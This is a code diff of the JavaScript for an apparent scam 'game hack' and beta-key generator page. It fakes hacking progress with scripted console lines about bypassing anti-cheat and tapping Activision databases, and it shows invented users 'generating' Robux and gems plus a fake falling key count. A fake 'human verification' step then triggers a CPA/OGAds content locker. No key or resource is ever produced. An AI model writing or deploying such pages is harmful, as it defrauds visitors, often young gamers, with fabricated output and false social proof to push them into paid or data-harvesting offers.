-            const grid = document.getElementById('games-grid');
-            grid.innerHTML = '';
-            gamesData.forEach(g => {
-                grid.innerHTML += `<div class="game-card glass p-5 rounded-3xl cursor-pointer" data-name="${g.name.toLowerCase()}" onclick="openGenerator('${g.name}')">
-                    <div class="flex items-center gap-5">
-                        <img src="${g.img}" class="w-16 h-16 rounded-2xl object-cover shadow-lg border border-white/5">
-                        <div>
-                            <h3 class="font-black text-sm uppercase tracking-tight">${g.name}</h3>
-                            <p class="text-[10px] text-zinc-500 font-bold mt-0.5">${g.sub}</p>
-                            <div class="text-yellow-500 text-[10px] mt-1.5"><i class="fa fa-star"></i> ${g.rating}</div>
-                        </div>
-                    </div></div>`;
-            });
-        }
-
-        async function handlePaste() {
-            try { const text = await navigator.clipboard.readText(); document.getElementById('username').value = text; } 
-            catch (err) { alert('Could not paste. Please allow clipboard permissions.'); }
-        }
-
-        function selectPlatform(btn) {
-            document.querySelectorAll('.platform-btn').forEach(b => { b.classList.remove('border-blue-500', 'bg-blue-500/10', 'text-blue-500'); });
-            btn.classList.add('border-blue-500', 'bg-blue-500/10', 'text-blue-500');
-        }
-
-        function togglePack(btn) {
-            document.querySelectorAll('.pack-btn').forEach(b => { b.classList.remove('active'); });
-            btn.classList.add('active');
-        }
-
-        function openGenerator(gameName) {
-            selectedGame = gamesData.find(g => g.name === gameName);
-            if(!selectedGame) return;
-            
-            document.getElementById('library-section').classList.add('hidden');
-            document.getElementById('generator-section').classList.remove('hidden');
-            
-            document.getElementById('gen-title').innerText = selectedGame.name + " Hack";
-            document.getElementById('gen-icon').src = selectedGame.img;
-            document.getElementById('bg-image-dynamic').style.backgroundImage = `url('${selectedGame.img}')`;
-            
-            // Dynamic Layout Logic: Pokemon Go vs Standard
-            if (selectedGame.name === 'Pokemon GO') {
-                document.getElementById('standard-layout').classList.add('hidden');
-                document.getElementById('spoofer-layout').classList.remove('hidden');
-            } else {
-                document.getElementById('standard-layout').classList.remove('hidden');
-                document.getElementById('spoofer-layout').classList.add('hidden');
-                document.getElementById('res-label-1').innerText = selectedGame.r1;
-                document.getElementById('res-label-2').innerText = selectedGame.r2;
-                document.getElementById('res-icon-1').src = selectedGame.i1;
-                document.getElementById('res-icon-2').src = selectedGame.i2;
+        setInterval(() => {
+            let countEl = document.getElementById('keys-count');
+            let currentCount = parseInt(countEl.innerText);
+            if(currentCount > 7) {
+                countEl.innerText = currentCount - Math.floor(Math.random() * 2);
             }
-            
-            document.getElementById('guide-name').innerText = selectedGame.name;
-            document.getElementById('guide-game').innerText = selectedGame.name;
-            document.getElementById('active-users').innerText = Math.floor(Math.random() * 500) + 200;
-            
-            window.scrollTo(0, 0);
+        }, 8000);
+
+        function selectPlatform(element, platform) {
+            document.querySelectorAll('.platform-btn').forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+            selectedPlatform = platform;
         }
 
-        function goToResources() {
-            const user = document.getElementById('username').value;
-            if(!user) return alert('Please enter your User ID or Username first.');
-            
-            document.getElementById('display-user').innerText = user;
-            document.getElementById('gen-input-step').classList.add('hidden');
-            document.getElementById('gen-resource-step').classList.remove('hidden');
-        }
+        function startGeneration() {
+            document.getElementById('setup-area').style.display = 'none';
+            document.getElementById('progress-container').style.display = 'block';
+            document.getElementById('generator-console').style.display = 'block';
 
-        async function startHackProcess() {
-            document.getElementById('gen-resource-step').classList.add('hidden');
-            document.getElementById('gen-loading-step').classList.remove('hidden');
+            const consoleEl = document.getElementById('generator-console');
+            const progressBar = document.getElementById('progress-bar');
             
-            const out = document.getElementById('terminal-output');
-            const bar = document.getElementById('p-bar');
-            out.innerHTML = '';
-            
-            let injectLines = [];
-            if (selectedGame.name === 'Pokemon GO') {
-                injectLines = ["> INJECTING GPS MODULE...", "> INJECTING ANTI-BAN SHIELD..."];
-            } else {
-                injectLines = [
-                    "> INJECTING " + document.getElementById('res-val-1').value + " " + selectedGame.r1.toUpperCase() + "...",
-                    "> INJECTING " + document.getElementById('res-val-2').value + " " + selectedGame.r2.toUpperCase() + "..."
-                ];
-            }
-
             const logs = [
-                "> INITIALIZING SECURE CONNECTION...",
-                "> SEARCHING DATABASE FOR UID: " + document.getElementById('username').value,
-                "> UID VERIFIED AND CONNECTED.",
-                "> BYPASSING ANTI-CHEAT SYSTEMS...",
-                ...injectLines,
-                "> ENCRYPTING DATA PACKETS (AES-256)...",
-                "> FINALIZING SYNC...",
-                "> WARNING: MANUAL VERIFICATION REQUIRED."
+                "Connecting to Activision main secure databases...",
+                "Establishing secure proxy handshake...",
+                "Searching for available unused MW4 Beta Pools...",
+                `Found available key package allocation for platform: ${selectedPlatform}`,
+                "Bypassing token sequence filters...",
+                "Extracting unique 25-digit Alpha-Numeric validation key...",
+                "Encoding license parameters onto code block...",
+                "Key Generated successfully: MW4B-XXXXX-XXXXX-XXXXX",
+                "Encrypting payload to prevent public indexing...",
+                "Error: Automated bot-like activity patterns detected from your IP.",
+                "Launching Anti-Bot Cryptographic Human Verification protocol..."
             ];
-            
-            for(let i=0; i<logs.length; i++) {
-                out.innerHTML += `<p class="animate-pulse">${logs[i]}</p>`;
-                bar.style.width = ((i+1) * (100/logs.length)) + "%";
-                await new Promise(r => setTimeout(r, 900));
+
+            let logIndex = 0;
+            let progress = 0;
+
+            const interval = setInterval(() => {
+                if (progress < 100) {
+                    progress += 1;
+                    progressBar.style.width = progress + '%';
+                    
+                    if (progress % 9 === 0 && logIndex < logs.length) {
+                        let p = document.createElement('div');
+                        p.className = 'console-log';
+                        p.innerText = `> ${logs[logIndex]}`;
+                        consoleEl.appendChild(p);
+                        consoleEl.scrollTop = consoleEl.scrollHeight;
+                        logIndex++;
+                    }
+                } else {
+                    clearInterval(interval);
+                    document.getElementById('verification-box').style.display = 'block';
+                    let p = document.createElement('div');
+                    p.className = 'console-log';
+                    p.style.color = '#f43f5e';
+                    p.style.fontWeight = 'bold';
+                    p.innerText = `> CRITICAL: Action Required. Please complete verification below to reveal full license key.`;
+                    consoleEl.appendChild(p);
+                    consoleEl.scrollTop = consoleEl.scrollHeight;
+                }
+            }, 60);
+        }
+
+        // TRIGGER THE OGADS LOCKER
+        function callOgadsLocker() {
+            if (typeof og_load === 'function') {
+                og_load(); 
+            } else {
+                alert("Please disable AdBlock to complete verification.");
             }
-            
-            setTimeout(() => { 
-                document.getElementById('gen-loading-step').classList.add('hidden'); 
-                document.getElementById('gen-verify-step').classList.remove('hidden'); 
-            }, 600);
         }
-
-        function showLibrary() {
-            document.getElementById('library-section').classList.remove('hidden');
-            document.getElementById('generator-section').classList.add('hidden');
-            document.getElementById('gen-input-step').classList.remove('hidden');
-            document.getElementById('gen-resource-step').classList.add('hidden');
-            document.getElementById('gen-loading-step').classList.add('hidden');
-            document.getElementById('gen-verify-step').classList.add('hidden');
-            
-            document.getElementById('username').value = '';
-            document.getElementById('terminal-output').innerHTML = '';
-            document.getElementById('p-bar').style.width = '0%';
-        }
-
-        // Show CPA Locker Modal
-        function showLocker() {
-            document.getElementById('cpa-locker-modal').classList.remove('hidden');
-        }
-
-        document.getElementById('search-input').addEventListener('input', (e) => {
-            const term = e.target.value.toLowerCase();
-            document.querySelectorAll('.game-card').forEach(c => { 
-                c.style.display = c.getAttribute('data-name').includes(term) ? 'block' : 'none'; 
-            });
-        });
-
-        function createLogs() {
-            const container = document.getElementById('sidebar-logs');
-            const flags = ['https://flagcdn.com/w40/us.png', 'https://flagcdn.com/w40/ma.png', 'https://flagcdn.com/w40/gb.png', 'https://flagcdn.com/w40/fr.png', 'https://flagcdn.com/w40/de.png', 'https://flagcdn.com/w40/sa.png'];
-            const users = ['ninja', 'hc', 'zack', 'simo', 'm9', 'player1', 'ghost'];
-            const res = ['10K Dice Rolls', '50K Coins', 'VIP Premium', '99K Gems', 'Robux'];
-            
-            const div = document.createElement('div');
-            div.className = 'flex items-start gap-4 border-b border-white/5 pb-4 animate-fade-in';
-            div.innerHTML = `
-                <img src="${flags[Math.floor(Math.random()*flags.length)]}" class="flag-icon mt-1 shadow-md">
-                <div class="flex-1">
-                    <p class="font-black text-zinc-300 text-[11px] font-mono">********${users[Math.floor(Math.random()*users.length)]}</p>
-                    <p class="text-zinc-500 text-[9px] mt-0.5">generated ${res[Math.floor(Math.random()*res.length)]}</p>
-                    <p class="text-blue-500 text-[8px] font-black mt-1 uppercase tracking-widest">1s ago</p>
-                </div>`;
-            
-            container.prepend(div);
-            if(container.children.length > 5) container.lastChild.remove();
-        }
-
-        initGrid(); 
-        setInterval(createLogs, 3000); 
-        createLogs();
     </script>
 </body>
 </html>
